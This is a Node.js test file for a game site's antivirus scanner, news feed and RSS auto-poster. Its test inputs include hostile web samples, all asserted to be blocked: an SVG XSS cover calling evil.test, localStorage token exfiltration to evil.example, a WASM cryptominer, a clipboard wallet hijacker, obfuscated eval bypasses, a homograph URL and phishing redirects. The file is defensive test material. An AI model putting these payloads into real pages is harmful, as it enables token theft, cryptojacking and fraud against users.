#!/usr/bin/env node
// Автотесты усиленного антивируса Games (v1.1), CI-сканера заявок,
// новостной ленты по 6 категориям и RSS/Atom автопостера.
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { loadGamesAntivirus, scanCommunitySubmissions, scanNewsFeedFile } from '../scripts/scan-submission-antivirus.mjs';
import { parseRssOrAtom, makeSafeNewsItem, mergeNewsFeeds } from '../scripts/auto-post-news.mjs';

const testDir = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(testDir, '../..');
// Форматы локальных обложек новостей (svg рисуем сами, jpg/png — от редакции).
const MediaCoverRe = /\.(svg|jpe?g|png|webp|avif)$/i;

const av = await loadGamesAntivirus();

// 1. Версия и 10-проходный контракт антивируса
assert.equal(av.VERSION, '1.1', 'GamesAntivirus must be v1.1');
const cleanGame = av.scanGameSync({
  title: 'Star Jumper',
  sourceType: 'html',
  htmlCode: '<!DOCTYPE html><html><body><canvas id="c"></canvas><script>const x = 1 + 2;</script></body></html>',
  coverDataUrl: 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="#1b2838"/></svg>'),
});
assert.equal(cleanGame.verdict, 'clean', 'Clean HTML5 game + safe SVG cover must be clean');
assert.equal(cleanGame.passCount, 10, 'Antivirus must execute exactly 10 passes');
assert.equal(cleanGame.riskScore, 0, 'Clean game risk score must be 0');

// 2. Блокировка заражённой SVG-обложки (SVG XSS) и бинарного полиглота
const xssSvg = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch("https://evil.test")</script></svg>');
assert.equal(av.scanCoverDataUrl(xssSvg).verdict, 'blocked', 'SVG XSS cover must be blocked');
const polyglotCover = 'data:image/png;base64,TVqQAAMAAAAEAAAA';
assert.equal(av.scanCoverDataUrl(polyglotCover).verdict, 'blocked', 'PE/MZ polyglot image cover must be blocked');
const gameWithBadCover = av.scanGameSync({
  title: 'Good code bad cover',
  sourceType: 'url',
  playUrl: 'https://m98978672-boop.github.io/games/country-atlas/index.html',
  coverDataUrl: xssSvg,
});
assert.equal(gameWithBadCover.verdict, 'blocked', 'Game with infected SVG cover must be blocked');

// 3. Новые сигнатуры v1.1: WASM-майнер, клиппер криптокошелька, кража localStorage
const wasmMiner = av.scanGameSync({
  title: 'Miner',
  sourceType: 'html',
  htmlCode: '<script>WebAssembly.instantiate(buf).then(() => start("cryptonight", "stratum+tcp://pool"));</script>',
});
assert.equal(wasmMiner.verdict, 'blocked', 'WASM cryptominer must be blocked');

const clipper = av.scanGameSync({
  title: 'Clipper',
  sourceType: 'html',
  htmlCode: '<script>navigator.clipboard.writeText("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");</script>',
});
assert.equal(clipper.verdict, 'blocked', 'Clipboard crypto address hijacker must be blocked');

const exfil = av.scanGameSync({
  title: 'Exfil',
  sourceType: 'html',
  htmlCode: '<script>const d = localStorage.getItem("token"); const img = new Image(); img.src = "https://evil.example/?d=" + d;</script>',
});
assert.equal(exfil.verdict, 'blocked', 'localStorage exfiltration via Image().src must be blocked');

// 3b. Red-team обходы: IDN-омоглиф, Unicode escape \u0065val, многократная склейка "e"+"v"+"a"+"l", внешний редирект
assert.equal(
  av.scanGameSync({ title: 'Homograph', sourceType: 'url', playUrl: 'https://githu\u0432.io/game/' }).verdict,
  'blocked',
  'Mixed-script IDN homograph domain must be blocked'
);
assert.equal(
  av.scanGameSync({ title: 'Clean Russian Path', sourceType: 'url', playUrl: 'https://m98978672-boop.github.io/games/игра/' }).verdict,
  'clean',
  'Valid HTTPS trusted domain with Cyrillic path must stay clean (no false positive)'
);
assert.equal(
  av.scanGameSync({ title: 'Unicode Eval', sourceType: 'html', htmlCode: '<script>window["\\u0065val"]("alert(1)");</script>' }).verdict,
  'blocked',
  'Unicode-escaped bracket eval must be blocked'
);
assert.equal(
  av.scanGameSync({ title: 'MultiSplit Eval', sourceType: 'html', htmlCode: '<script>window["e"+"v"+"a"+"l"]("alert(1)");</script>' }).verdict,
  'blocked',
  'Multi-concatenated bracket eval must be blocked'
);
assert.equal(
  av.scanGameSync({ title: 'Redirect', sourceType: 'html', htmlCode: '<script>location.replace("https://evil-phish.example/steal");</script>' }).verdict,
  'blocked',
  'Forced external location.replace redirect must be blocked'
);
assert.equal(
  av.scanGameSync({ title: 'PackPolyglot', sourceType: 'url', playUrl: 'https://m98978672-boop.github.io/games/', customCoverData: polyglotCover }).verdict,
  'blocked',
  'Polyglot cover passed via customCoverData (user-games.js importPack) must be blocked'
);

// 4. Антивирус для новостей (scanNewsItemSync)
assert.equal(
  av.scanNewsItemSync({ title: 'Нормальная новость о науке', summary: 'Короткое описание', body: ['Текст статьи.'], sourceUrl: 'https://nplus1.ru/' }).ok,
  true,
  'Clean news item must pass scanNewsItemSync'
);
assert.equal(
  av.scanNewsItemSync({ title: 'Вредная <script>alert(1)</script>', sourceUrl: 'https://example.com/' }).ok,
  false,
  'Script injection in news item must be blocked'
);
assert.equal(
  av.scanNewsItemSync({ title: 'Новость с сокращателем', sourceUrl: 'https://bit.ly/3phish' }).ok,
  false,
  'Shortened URL in news item must be blocked'
);

// 5. Проверка site/news-feed.json (19 верифицированных статей, 6 категорий, уникальные коды, фото, доказательства, комментарии, 0 угроз)
const feed = JSON.parse(await readFile(path.join(repoRoot, 'site/news-feed.json'), 'utf8'));
assert.equal(feed.autoPost?.enabled, true, 'autoPost must be enabled in news-feed.json');
assert.ok(Array.isArray(feed.items) && feed.items.length >= 19, 'news-feed.json must have at least 19 verified articles');
const presentCats = new Set(feed.items.map((x) => x.category));
for (const reqCat of ['games', 'tech', 'science', 'world', 'security', 'facts']) {
  assert.ok(presentCats.has(reqCat), `news-feed.json must cover category "${reqCat}"`);
}
const seenCodes = new Set();
const verifiedArticles = feed.items.filter((item) => item.factCheck && item.factCheck.verified);
const autoArticles = feed.items.filter((item) => !item.factCheck || !item.factCheck.verified);
assert.ok(verifiedArticles.length >= 19, 'news-feed.json must keep at least 19 verified coded articles');
for (const item of autoArticles) {
  assert.match(String(item.code || ''), /^[A-Z]-\d{3}$/, `Auto-posted ${item.id} must have short code like W-805`);
  assert.equal(seenCodes.has(item.code), false, `Duplicate news code: ${item.code}`);
  seenCodes.add(item.code);
}
for (const item of verifiedArticles) {
  assert.match(String(item.code || ''), /^[A-Z]-\d{3}$/, `Article ${item.id} must have short code like G-101`);
  assert.equal(seenCodes.has(item.code), false, `Duplicate news code: ${item.code}`);
  seenCodes.add(item.code);

  assert.ok(item.image && /^site\/assets\//.test(item.image), `Article ${item.code} must declare local site/assets/ image`);
  assert.equal(existsSync(path.join(repoRoot, item.image)), true, `Image file for ${item.code} must exist on disk: ${item.image}`);

  assert.equal(item.factCheck?.verified, true, `Article ${item.code} must carry verified factCheck`);
  assert.ok(Array.isArray(item.proofs) && item.proofs.length >= 1, `Article ${item.code} must include at least 1 proof link`);
  for (const proof of item.proofs) {
    assert.match(String(proof.url || ''), /^https:\/\//, `Proof URL for ${item.code} must be HTTPS`);
  }

  // Комментарии пишут только реальные читатели: заранее заготовленных (симулированных) нет.
  assert.ok(Array.isArray(item.comments), `Article ${item.code} must declare comments array`);
  assert.equal(item.comments.length, 0, `Article ${item.code} must NOT ship simulated/pre-written comments`);
}
// Запас статей «на сейчас и на будущее»: 100 штук (40 сейчас + 60 в очередь),
// каждые со своим фактчеком, локальной обложкой и БЕЗ заготовленных комментариев.
const nowQueue = feed.items.filter((i) => i.queue === 'now');
const futureQueue = feed.items.filter((i) => i.queue === 'future');
assert.ok(nowQueue.length >= 40, `news backlog must keep >= 40 "now" articles (found ${nowQueue.length})`);
assert.ok(futureQueue.length >= 60, `news backlog must keep >= 60 scheduled articles (found ${futureQueue.length})`);
assert.ok(feed.autoPost?.backlog?.total >= 100, 'autoPost.backlog must account for >= 100 prepared articles');
for (const item of [...nowQueue, ...futureQueue]) {
  assert.equal(item.factCheck?.verified, true, `${item.code} from backlog must carry verified factCheck`);
  assert.ok(Array.isArray(item.proofs) && item.proofs.length >= 1, `${item.code} must keep a proof link`);
  assert.equal(item.comments.length, 0, `${item.code} must not ship pre-written comments`);
  assert.ok(item.image && /^site\/assets\//.test(item.image), `${item.code} must declare a local cover`);
  assert.equal(existsSync(path.join(repoRoot, item.image)), true, `${item.code} cover must exist: ${item.image}`);
}
for (const item of futureQueue) {
  assert.match(String(item.scheduledFor || ''), /^\d{4}-\d{2}-\d{2}$/, `${item.code} must carry scheduledFor date`);
  assert.ok(item.scheduledFor > '2026-11-18', `${item.code} scheduled date must be in the future`);
}
// У КАЖДОЙ статьи ленты обложка должна лежать в репозитории: битые картинки
// не видит ни один другой тест (так в main накопилось 37 «мёртвых» ссылок).
const allArticles = feed.items.filter((i) => i.image && MediaCoverRe.test(i.image));
const missingCovers = allArticles.filter((i) => !existsSync(path.join(repoRoot, i.image)));
assert.equal(
  missingCovers.length,
  0,
  `${missingCovers.length} статей ссылаются на несуществующие обложки: ` +
    missingCovers.slice(0, 3).map((i) => i.code).join(', '),
);
assert.equal(allArticles.length, feed.items.length, 'у каждой статьи ленты есть локальная обложка');

// Очередь должна быть равномерна по рубрикам, а не в одну тему.
const backlogCats = new Set([...nowQueue, ...futureQueue].map((i) => i.category));
assert.ok(backlogCats.size >= 6, 'backlog must cover all 6 news categories');

const shippedComments = feed.items.reduce((sum, item) => sum + (Array.isArray(item.comments) ? item.comments.length : 0), 0);
assert.equal(shippedComments, 0, 'news-feed.json must not contain any pre-written comments (only live reader comments)');

const newsAppLive = await readFile(path.join(repoRoot, 'news/app.js'), 'utf8');
assert.ok(newsAppLive.includes('Только реальные комментарии читателей'), 'news/app.js must render only live reader comments');
assert.equal(/const seeded = Array\.isArray\(item\?\.comments\)/.test(newsAppLive), false, 'news/app.js must not merge shipped comments into the reader');

const newsAppSrc = await readFile(path.join(repoRoot, 'news/app.js'), 'utf8');
for (const token of ['../site/news-feed.json', 'findArticleByIdOrCode', 'code-pill', 'reader-figure', 'proofs-box', 'addComment', 'comments-section', 'news:selectCategory', 'news:unreadCount']) {
  assert.ok(newsAppSrc.includes(token), `news/app.js must implement ${token}`);
}

const newsScanResults = await scanNewsFeedFile(av);
assert.equal(newsScanResults.filter((r) => r.verdict === 'blocked').length, 0, 'All news-feed.json items must pass antivirus');

// 6. Проверка community-games.json через CI-сканер
const commScan = await scanCommunitySubmissions(av);
assert.ok(commScan.length >= 1, 'Community catalog must have games to scan');
assert.equal(commScan.filter((r) => r.verdict === 'blocked').length, 0, 'All community games must pass CI antivirus');

// 7. Проверка парсера RSS 2.0 и Atom + фильтрации угроз в mergeNewsFeeds
const rssSample = `<?xml version="1.0"?><rss version="2.0"><channel>
  <item>
    <title><![CDATA[Космический телескоп открыл новую экзопланету]]></title>
    <link>https://nplus1.ru/news/2026/11/16/exoplanet</link>
    <description><![CDATA[<p>Учёные подтвердили наличие атмосферы &mdash; подробности исследования.</p>]]></description>
    <pubDate>Mon, 16 Nov 2026 12:00:00 GMT</pubDate>
    <category>Космос</category>
  </item>
  <item>
    <title>Вредоносная ссылка</title>
    <link>https://bit.ly/phishing123</link>
    <description>Попытка просунуть сокращатель в автопост.</description>
  </item>
</channel></rss>`;
const parsedRss = parseRssOrAtom(rssSample);
assert.equal(parsedRss.length, 2, 'RSS parser must extract items');
const sourceMeta = { id: 'nplus1', category: 'science', name: 'N+1', icon: '🔬', accent: 'indigo' };
const incoming = parsedRss.map((r) => makeSafeNewsItem(r, sourceMeta));
const merged = mergeNewsFeeds(feed.items, incoming, av);
assert.equal(merged.added, 1, 'mergeNewsFeeds must add clean RSS item and drop shortened phishing URL');

const atomSample = `<?xml version="1.0"?><feed xmlns="http://www.w3.org/2005/Atom">
  <entry>
    <title>Новый релиз WebGPU для браузеров</title>
    <link rel="alternate" href="https://habr.com/ru/news/999999/"/>
    <summary>Короткий пересказ обновления стандарта WebGPU для браузерных игр.</summary>
    <updated>2026-11-16T10:00:00Z</updated>
  </entry>
</feed>`;
const parsedAtom = parseRssOrAtom(atomSample);
assert.equal(parsedAtom.length, 1, 'Atom parser must extract entries');
assert.equal(parsedAtom[0].link, 'https://habr.com/ru/news/999999/', 'Atom link must be extracted');

// 8. Проверка HTML-витрины (site/index.html + корневой index.html), отдельного отдела news/ и GitHub workflow автопоста
const siteHtml = await readFile(path.join(repoRoot, 'site/index.html'), 'utf8');
const rootHtml = await readFile(path.join(repoRoot, 'index.html'), 'utf8');
for (const [label, html] of [['site/index.html', siteHtml], ['index.html', rootHtml]]) {
  for (const marker of ['portal-news-panel', 'newsEmbedFrame', 'portalNewsCloudsStrip', 'data-portal-tab="news"', 'data-open-news="true"', 'data-open-antivirus="file"']) {
    assert.ok(html.includes(marker), `${label} must include ${marker}`);
  }
  assert.equal(html.includes('news-teaser-strip'), false, `${label} must NOT mix news teaser into games storefront`);
  assert.equal(html.includes('portal-main-tabs'), false, `${label} must NOT add extra tab bar above store ribbon`);
  // Движок теперь подключён официально (shared/engine.js + собранный бандл),
  // но внутренние модули движка (ratcore/src/**) витрине по-прежнему недоступны напрямую.
  assert.equal(/ratcore\/src\//.test(html), false, `${label} must not import internal engine modules directly`);
  assert.equal(/ratcore\/(playground|demos|tests|comms|reports)\//.test(html), false, `${label} must not link engine internals from the storefront`);
  assert.ok(html.includes('shared/engine.js'), `${label} must load the engine bridge`);
}
assert.ok(siteHtml.includes('data-src="../news/index.html?embed=games"'), 'site/index.html must embed ../news/index.html?embed=games');
assert.ok(rootHtml.includes('data-src="news/index.html?embed=games"'), 'root index.html must embed news/index.html?embed=games');

for (const rel of ['news/index.html', 'news/styles.css', 'news/app.js', 'news/manifest.webmanifest']) {
  assert.equal(existsSync(path.join(repoRoot, rel)), true, `Standalone news app file must exist: ${rel}`);
}
const newsAppHtml = await readFile(path.join(repoRoot, 'news/index.html'), 'utf8');
for (const marker of ['../site/game-antivirus.js', './styles.css', './app.js', 'newsSidebar', 'newsWorkspace', 'quickCodesGrid', 'readerModal', 'composeModal']) {
  assert.ok(newsAppHtml.includes(marker), `news/index.html must include ${marker}`);
}
const sitemapXml = await readFile(path.join(repoRoot, 'sitemap.xml'), 'utf8');
assert.ok(sitemapXml.includes('/games/news/'), 'sitemap.xml must include /games/news/');
const swJs = await readFile(path.join(repoRoot, 'sw.js'), 'utf8');
assert.ok(swJs.includes("url.pathname.includes('/news/')"), 'sw.js must exclude standalone /news/ app just like /ratmes/');

const workflowYml = await readFile(path.join(repoRoot, '.github/workflows/auto-news.yml'), 'utf8');
assert.ok(workflowYml.includes("cron: '0 */6 * * *'"), 'auto-news workflow must schedule cron every 6 hours');
assert.ok(workflowYml.includes('auto-post-news.mjs'), 'auto-news workflow must run auto-post-news.mjs');
assert.ok(workflowYml.includes('scan-submission-antivirus.mjs'), 'auto-news workflow must verify feed with antivirus');

console.log('OK: Games Antivirus v1.1, CI submission scanner, standalone News app (/news/) & Auto-Poster tests passed.');
